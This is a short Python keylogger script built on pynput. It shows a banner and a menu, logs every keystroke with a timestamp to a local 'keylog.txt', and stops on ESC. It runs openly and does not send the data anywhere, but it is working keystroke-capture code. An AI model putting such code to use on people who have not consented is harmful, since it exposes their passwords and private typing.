from pynput.keyboard import Listener, Key
import logging

def print_header():
    header = """
  __   _   __ __   ___   _     ___     _  __  ___   __   __ _      __     __    __   ___   ___  
/' _/ | | |  V  | | _,\ | |   | __|   | |/ / | __|  \ `v' /| |    /__\   / _]  / _] | __| | _ \ 
`._`. | | | \_/ | | v_/ | |_  | _|    |   <  | _|    `. .' | |_  | \/ | | [/\ | [/\ | _|  | v / 
|___/ |_| |_| |_| |_|   |___| |___|   |_|\_\ |___|    !_!  |___|  \__/   \__/  \__/ |___| |_|_\ 
"""
    print(header)
    print("="*80)
    print("Welcome to the Simple Keylogger.")
    print("Instructions:")
    print("- This tool records keystrokes and saves them to a log file (e.g., 'keylog.txt').")
    print("- To stop typing and exit the keylogger, press the 'ESC' key, then select '2' to exit the program.")
    print("="*80)

def start_keylogger(log_file='keylog.txt'):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    
    def on_press(key):
        logging.info(str(key))

        # Stop keylogger if user presses the ESC key
        if key == Key.esc:
            print("ESC pressed. Keylogger paused. Press '2' to exit.")
            return False  # Stops the listener

    # Start listening to keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
    print_header()
    
    while True:
        print("Select an option:")
        print("1. Start logging keystrokes.")
        print("2. Exit.")
        choice = input("Enter your choice (1 or 2): ")

        if choice == '2':
            print("Exiting the program. Goodbye!")
            break
        elif choice == '1':
            print("Logging started. Type anything you want; press 'ESC' to stop.")
            start_keylogger()
        else:
            print("Invalid choice, please select 1 or 2.")

if __name__ == "__main__":
    main()